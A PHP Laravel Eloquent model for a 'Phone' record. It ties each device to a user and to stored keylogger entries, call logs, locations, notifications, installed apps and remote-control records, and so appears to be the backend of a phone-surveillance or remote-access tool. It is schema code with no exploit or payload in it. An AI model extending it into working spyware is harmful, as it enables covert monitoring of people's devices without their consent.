<?php

/**
 * Created by Reliese Model.
 */

namespace App\Models;

use Carbon\Carbon;
use Illuminate\Database\Eloquent\Collection;
use Illuminate\Database\Eloquent\Model;

/**
 * Class Phone
 * 
 * @property int $id
 * @property string|null $phone
 * @property string|null $data
 * @property Carbon|null $updatedon
 * @property int $users_id
 * @property string|null $token
 * @property string|null $perms
 * @property string|null $fcm
 * 
 * @property User $user
 * @property Collection|App[] $apps
 * @property Collection|Call[] $calls
 * @property Collection|Keylogger[] $keyloggers
 * @property Collection|Location[] $locations
 * @property Collection|Notification[] $notifications
 * @property Collection|Remotecontrol[] $remotecontrols
 *
 * @package App\Models
 */
class Phone extends Model
{
	protected $table = 'phone';
	public $timestamps = false;

	protected $casts = [
		'users_id' => 'int'
	];

	protected $dates = [
		'updatedon'
	];

	protected $hidden = [
		'token'
	];

	protected $fillable = [
		'phone',
		'data',
		'updatedon',
		'users_id',
		'token',
		'perms',
		'fcm'
	];

	public function user()
	{
		return $this->belongsTo(User::class, 'users_id');
	}

	public function apps()
	{
		return $this->hasMany(App::class);
	}

	public function calls()
	{
		return $this->hasMany(Call::class);
	}

	public function keyloggers()
	{
		return $this->hasMany(Keylogger::class);
	}

	public function locations()
	{
		return $this->hasMany(Location::class);
	}

	public function notifications()
	{
		return $this->hasMany(Notification::class);
	}

	public function remotecontrols()
	{
		return $this->hasMany(Remotecontrol::class);
	}
}
